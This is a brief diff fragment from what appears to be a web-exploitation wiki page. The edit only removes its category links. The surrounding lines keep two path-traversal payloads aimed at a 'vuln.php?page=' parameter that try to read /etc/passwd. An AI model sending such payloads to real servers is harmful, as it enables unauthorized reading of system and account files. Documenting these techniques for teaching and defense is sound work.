@@ -71,4 +71,4 @@ vuln.php?page=../../../../../../../../../../../../../../../../../../../../etc/pa
 vuln.php?page=/etc/passwd/../../../../../../../../../../../../../../../../../../../..
 ```
 
-[Category:Web](/Category:Web "wikilink") [Category:Exploitation](/Category:Exploitation "wikilink")
+
